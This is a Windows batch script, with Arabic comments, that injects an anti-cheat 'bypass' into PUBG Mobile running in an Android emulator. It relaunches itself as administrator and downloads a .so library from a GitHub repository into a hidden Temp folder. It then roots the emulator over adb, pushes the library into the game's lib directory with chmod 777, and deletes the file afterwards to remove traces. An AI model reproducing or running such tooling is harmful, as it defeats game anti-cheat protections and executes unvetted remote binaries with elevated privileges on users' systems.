@echo off
chcp 65001 >nul

:: استلام اسم النسخة من برنامج الـ ++C
set "pkg=%~1"
:: لو مفيش نسخة مبعوتة، خليها العالمية كافتراضي
if "%pkg%"=="" set "pkg=com.tencent.ig"

:: التأكد من الصلاحيات
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: قراءة المسار من ملف رديت (المسار اللي اتفقنا عليه)
set "redit_file=C:\Windows\Temp\menta\redit.txt"

if not exist "%redit_file%" (
    echo ERROR: redit.txt not found!
    pause
    exit /b
)

for /f "tokens=*" %%A in ('type "%redit_file%"') do set "target_path=%%A"
set "target_path=%target_path:\\=\%"
set "target_path=%target_path:AndroidEmulatorEn.exe=adb.exe%"

for %%I in ("%target_path%") do set "target_dir=%%~dpI"
cd /d "%target_dir%" || (echo FAIL & pause & exit /b)

set "hiddenPath=C:\Windows\Temp\menta"
if not exist "%hiddenPath%" mkdir "%hiddenPath%"

set "fileName=libAkAudioVisiual.so"

echo [>] Downloading Bypass File for: %pkg%
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/jack74512/UAO7/raw/refs/heads/main/%fileName%' -OutFile '%hiddenPath%\%fileName%'"

if not exist "%hiddenPath%\%fileName%" (
    echo ERROR: Download Failed!
    pause
    exit /b
)

adb kill-server
adb start-server

echo [>] Launching PUBG Version: %pkg%
adb shell monkey -p %pkg% -c android.intent.category.LAUNCHER 1
timeout /t 8 >nul

adb root
adb remount

echo [>] Injecting Bypass into %pkg%...
adb push "%hiddenPath%\%fileName%" /data/local/tmp/
:: استخدام اسم الحزمة المتغير هنا
adb shell mv /data/local/tmp/%fileName% /data/data/%pkg%/lib/
adb shell chmod 777 /data/data/%pkg%/lib/%fileName%

echo [>] Waiting for 45 seconds...
timeout /t 45 >nul

echo [>] Cleaning up %pkg%...
adb shell rm /data/data/%pkg%/lib/%fileName%
if exist "%hiddenPath%\%fileName%" del "%hiddenPath%\%fileName%"

echo SUCCESS! Bypass Finished for %pkg%.
pause
